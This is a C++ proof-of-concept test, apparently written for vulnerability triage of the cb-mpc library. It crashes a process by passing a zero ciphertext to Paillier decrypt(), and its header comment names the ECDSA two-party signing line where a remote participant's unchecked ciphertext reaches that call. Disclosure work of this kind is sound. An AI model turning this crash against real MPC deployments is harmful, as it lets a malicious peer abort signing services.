/**
 * @file test_paillier_abort.cpp
   * @brief Triage PoC: Deterministic SIGABRT via Paillier decrypt() cb_assert failure
 *
 * This standalone test demonstrates that cb_assert remains active in Release builds
 * (-O3 -DNDEBUG) and triggers SIGABRT (exit code 134) when a malformed ciphertext
 * reaches paillier_t::decrypt() without verify_cipher() validation.
 *
 * The actual vulnerability is in the ECDSA-2PC signing path:
 *   src/cbmpc/protocol/ecdsa_2p.cpp:373: bn_t s = key.paillier.decrypt(c[i]);
 *   where c[i] is received from a remote MPC participant via p2_to_p1() without
 *   prior verify_cipher() check.
 *
 * Build: cmake --build build/Release --target test_paillier_abort
 * Run:   ./build/Release/bin/Release/test_paillier_abort
 * Expected: Exit code 134 (SIGABRT)
 */

#include <cbmpc/crypto/base.h>
#include <iostream>

using namespace coinbase::crypto;

int main() {
      std::cout << "=== Paillier SIGABRT PoC (Release Build) ===" << std::endl;
    std::cout << "Creating Paillier key (2048-bit)..." << std::endl;

    // Create a valid Paillier key
    paillier_t paillier;
    paillier.generate();

    const mod_t& N = paillier.get_N();
    const mod_t& NN = paillier.get_NN();

    std::cout << "N bits:  " << N.get_bits_count() << std::endl;
    std::cout << "NN bits: " << NN.get_bits_count() << std::endl;

    // Construct malformed ciphertext: value = 0
    // This violates cb_assert(src > 0 && src < NN) at base_paillier.cpp:203
    bn_t malformed_cipher = bn_t(0);

    std::cout << std::endl;
    std::cout << "Malformed ciphertext: 0" << std::endl;
    std::cout << "This violates: src > 0 && src < NN" << std::endl;
    std::cout << std::endl;

    std::cout << "Calling paillier.decrypt(malformed_cipher)..." << std::endl;
    std::cout << "Expected: assertion_failed_t exception -> uncaught -> SIGABRT" << std::endl;
    std::cout << std::endl;

    // This will trigger cb_assert failure and throw assertion_failed_t
    // Since we don't catch it, std::terminate() calls abort() -> SIGABRT
    bn_t result = paillier.decrypt(malformed_cipher);

    // This line should never be reached
    std::cout << "ERROR: Should have aborted! Result: " << result.to_string() << std::endl;

    return 0;
}
